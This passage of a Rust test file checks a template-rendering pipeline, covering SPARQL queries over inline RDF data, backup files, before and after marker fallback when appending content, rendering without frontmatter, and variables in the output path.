// ===========================================================================

#[test]
fn test_e2e_ttl_to_sparql_to_rendered_output() {
    let temp_dir = TempDir::new().unwrap();

    // Use the exact same pattern as test_pipeline_render_template_with_sparql
    // but with two people to verify SPARQL result iteration.
    let template_content = r#"---
to: "e2e_output.txt"
prefixes:
  ex: "http://example.org/"
rdf_inline:
  - "@prefix ex: <http://example.org/> . ex:alice a ex:Person ; ex:name 'Alice' . ex:bob a ex:Person ; ex:name 'Bob' ."
sparql:
  people: "SELECT ?s WHERE { ?s a ex:Person }"
---
Found {{ sparql_results.people | length }} person(s)."#;
    let template_path = write_template(&temp_dir, "e2e.tmpl", template_content);

    let mut pipeline = Pipeline::new().unwrap();

    // Change working directory to temp_dir so the relative "e2e_output.txt" resolves there
    let original_dir = std::env::current_dir().unwrap();
    std::env::set_current_dir(temp_dir.path()).unwrap();

    let result = pipeline.render_file(&template_path, &BTreeMap::new(), false);
    let plan = result.expect("E2E render should succeed");

    assert!(
        plan.content().contains("Found 2 person"),
        "Output should show 2 people, got: {}",
        plan.content()
    );

    // Apply the plan to write the file (still in temp_dir)
    plan.apply().expect("E2E apply should succeed");

    // Restore working directory
    std::env::set_current_dir(&original_dir).unwrap();

    let output_path = temp_dir.path().join("e2e_output.txt");
    assert!(output_path.exists(), "Output file should be created");
}

// ===========================================================================
// Test 13: Backup mode creates backup file
// ===========================================================================

#[test]
fn test_backup_mode_creates_backup_before_injection() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "backup_test.txt", "original content\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
append: true
backup: true
---
appended line"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "backup.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply with backup should succeed");

    // Backup file should exist
    let backup_path = format!("{}.backup", target_path.display());
    assert!(
        std::path::Path::new(&backup_path).exists(),
        "Backup file should be created at {}",
        backup_path
    );

    // Backup should contain original content
    let backup_content = std::fs::read_to_string(&backup_path).unwrap();
    assert_eq!(backup_content, "original content\n");

    // Original should have appended content
    let current = std::fs::read_to_string(&target_path).unwrap();
    assert!(current.contains("appended line"));
}

// ===========================================================================
// Test 14: Before-marker fallback to append when marker not found
// ===========================================================================

#[test]
fn test_injection_before_marker_falls_back_to_append() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "fallback.txt", "existing content\n");

    // Use a marker that does NOT exist in the file
    let template_content = format!(
        r#"---
to: "{}"
inject: true
before: "NONEXISTENT_MARKER"
---
fallback content"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "fallback.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed");

    let result = std::fs::read_to_string(&target_path).unwrap();
    assert!(
        result.contains("fallback content"),
        "When before-marker is not found, content should be appended"
    );
    assert!(
        result.contains("existing content"),
        "Original content should be preserved"
    );
}

#[test]
fn test_injection_after_marker_falls_back_to_append() {
    let temp_dir = TempDir::new().unwrap();
    let target_path = write_file(&temp_dir, "fallback.txt", "existing content\n");

    let template_content = format!(
        r#"---
to: "{}"
inject: true
after: "NONEXISTENT_MARKER"
---
fallback content"#,
        target_path.display()
    );
    let template_path = write_template(&temp_dir, "fallback.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let plan = pipeline
        .render_file(&template_path, &BTreeMap::new(), false)
        .expect("render_file should succeed");

    plan.apply().expect("apply should succeed");

    let result = std::fs::read_to_string(&target_path).unwrap();
    assert!(
        result.contains("fallback content"),
        "When after-marker is not found, content should be appended"
    );
}

// ===========================================================================
// Test 15: Template with no frontmatter renders body directly
// ===========================================================================

#[test]
fn test_template_no_frontmatter_renders_body() {
    // Templates without frontmatter require at least an empty YAML block (---)
    // because render_frontmatter() cannot deserialize null as Frontmatter.
    // Use render_body() directly to test plain template rendering without frontmatter.
    let mut pipeline = Pipeline::new().unwrap();
    let mut ctx = tera::Context::new();
    ctx.insert("variable", "rendered");

    let result = pipeline
        .render_body("No frontmatter here. Just plain {{ variable }} content.", &ctx)
        .expect("render_body should succeed with no frontmatter");

    assert_eq!(result, "No frontmatter here. Just plain rendered content.");
}

// ===========================================================================
// Test 16: Pipeline with frontmatter variables rendered in 'to' field
// ===========================================================================

#[test]
fn test_frontmatter_to_field_renders_variables() {
    let temp_dir = TempDir::new().unwrap();
    let output_path = temp_dir.path().join("dynamic_name_Alice.txt");

    let template_content = format!(
        r#"---
to: "{}"
---
Content for {{{{ name }}}}"#,
        output_path.display()
    );
    let template_path = write_template(&temp_dir, "dynamic.tmpl", &template_content);

    let mut pipeline = Pipeline::new().unwrap();
    let mut vars = BTreeMap::new();
    vars.insert("name".to_string(), "Alice".to_string());

    let plan = pipeline
        .render_file(&template_path, &vars, false)
        .expect("render_file should succeed");

    // Output path should match the rendered 'to' field
    assert_eq!(
        plan.output_path().file_name().unwrap().to_str().unwrap(),
        "dynamic_name_Alice.txt"
    );
    assert_eq!(plan.content(), "Content for Alice");
}
